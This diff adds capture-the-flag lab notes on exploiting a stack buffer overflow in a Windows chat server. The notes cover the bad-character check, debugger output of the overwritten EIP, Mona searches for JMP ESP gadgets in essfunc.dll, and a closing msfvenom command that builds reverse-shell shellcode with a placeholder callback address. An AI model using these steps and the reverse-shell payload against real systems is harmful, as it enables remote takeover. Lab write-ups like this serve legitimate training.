@@ -341,4 +341,72 @@ Here unlike all other files listed these two all show false for Rebase, SafeSEH,
 - Third‑party DLLs often have no protections, which is why they’re used for exploits.
 - This is why Brainstorm tells you to “check the DLL file”.
 
+### Check for bad characters not to use in shell sent in payload
 
+We need to check the a list of bad char for our payload to make sure the program doesn’t break, change, or stop copying our shellcode.
+- Here a list of badchar \x01 to \xff are sent in message section to chatserver and inspected in Immunity debugger.
+- \x00 is expected to be bad so not done.
+
+### If sent should show them in correct ascending order which means:
+-  No bytes are being filtered, truncated, or altered
+-  No encoding or sanitization
+-  No null‑termination or early stop
+-  No corruption from network layer
+
+### What this tells you for exploit development
+- You can safely generate shellcode using only one bad character: \x00.
+- Your payload will execute reliably because the stack and heap aren’t mangling bytes.
+- You can now move on to finding a JMP ESP or similar gadget in your unprotected DLL.
+
+### Immunity Debugger showed a full set without issue but does not show when copied in clipboard.
+```
+0081EEAC   41414141   AAAA
+0081EEB0   41414141   AAAA  <--- overflow up to EIP
+0081EEB4   42424242   BBBB  <--- EIP replaced with BBBB as expected
+0081EEB8   04030201         <--- All ASCII characters visible in Immunity debugger
+0081EEBC   08070605              They do not show when copies to clipboard.   
+...
+0081EED8   24232221   !"#$
+0081EEDC   28272625   %&'(
+0081EEE0   2C2B2A29   )*+,
+0081EEE4   302F2E2D   -./0
+0081EEE8   34333231   1234
+0081EEEC   38373635   5678
+0081EEF0   3C3B3A39   9:;<
+0081EEF4   403F3E3D   =>?@
+0081EEF8   44434241   ABCD
+0081EEFC   48474645   EFGH
+...
+```
+Next need to find A location for placing in EIP, from a dll file that in this THM module contains a JMP ESP function to call the payload the will be overflowed over beyond EIP into the ESP section. 
+
+Using Mona again in the immunity debugger in the command bar at bottom send 
+```
+!mona find -s "\xff\xe4" -m essfunc.dll
+```
+The output shows 9 possible locations for use we will just use the first one (0x625014df)
+
+```
+...
+Address      Type         Address/ACLinfo                        Other info
+----------   ----------   ------------------------------------   --------------------------------------------------------------------------------------------------------------------------------------------
+0x625014df : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\binary\essfunc.dll), 0x0
+0x625014eb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\binary\essfunc.dll), 0x0
+0x625014f7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\binary\essfunc.dll), 0x0
+...
+```
+
+
+```
+
+
+```
+
+
+```
+
+When you build your final exploit, use:
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -b "\x00" -f python
+and insert that shellcode after your padding.
+```
